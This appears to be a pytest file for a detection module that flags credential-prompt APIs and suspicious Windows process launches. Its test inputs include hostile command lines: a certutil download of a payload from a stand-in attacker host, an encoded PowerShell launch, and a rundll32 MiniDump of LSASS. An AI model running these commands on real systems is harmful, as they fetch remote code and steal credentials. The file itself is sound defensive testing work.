from detector.rules import detect_credential_prompt
from detector.rules import detect_suspicious_process


def test_credential_detection():
    script = """
    PromptForCredential
    GetNetworkCredential
    ValidateCredentials
    """

    result = detect_credential_prompt(script)

    assert result["detected"] is True
    assert result["severity"] == "HIGH"
    assert result["indicator_count"] == 3


def test_credential_benign():
    script = """
    Write-Host "Hello World"
    """

    result = detect_credential_prompt(script)

    assert result["detected"] is False


def test_encoded_powershell():
    result = detect_suspicious_process(
        "powershell.exe -nop -enc ABC123",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    )

    assert result["detected"] is True
    assert "command:-enc" in result["indicators"]


def test_normal_powershell():
    result = detect_suspicious_process(
        "powershell.exe Get-Process",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    )

    assert result["detected"] is False

def test_credential_partial_matches():
    script_one = "PromptForCredential"
    script_two = "PromptForCredential GetNetworkCredential"

    res_low = detect_credential_prompt(script_one)
    res_med = detect_credential_prompt(script_two)

    assert res_low["detected"] is True
    assert res_low["severity"] == "LOW"
    assert "PromptForCredential" in res_low["indicators"]

    assert res_med["detected"] is True
    assert res_med["severity"] == "MEDIUM"
    assert len(res_med["indicators"]) == 2


def test_lolbin_certutil_download():
    result = detect_suspicious_process(
        "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        "C:\\Windows\\System32\\certutil.exe"
    )

    assert result["detected"] is True
    assert result["severity"] == "HIGH"  # Updated from MEDIUM to HIGH
    assert "process:certutil.exe" in result["indicators"]
    assert "command:urlcache" in result["indicators"]
    assert "command:http://" in result["indicators"]

def test_rundll32_memory_dump():
    result = detect_suspicious_process(
        "rundll32.exe comsvcs.dll, MiniDump 672 C:\\temp\\lsass.dmp full",
        "C:\\Windows\\System32\\rundll32.exe"
    )

    assert result["detected"] is True
    assert result["severity"] == "HIGH"
    assert "memory_dump_behavior" in result["indicators"]


def test_suspicious_path_execution():
    result = detect_suspicious_process(
        "C:\\Users\\Public\\script.ps1",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    )

    assert result["detected"] is True
    assert "path:\\users\\public\\" in result["indicators"]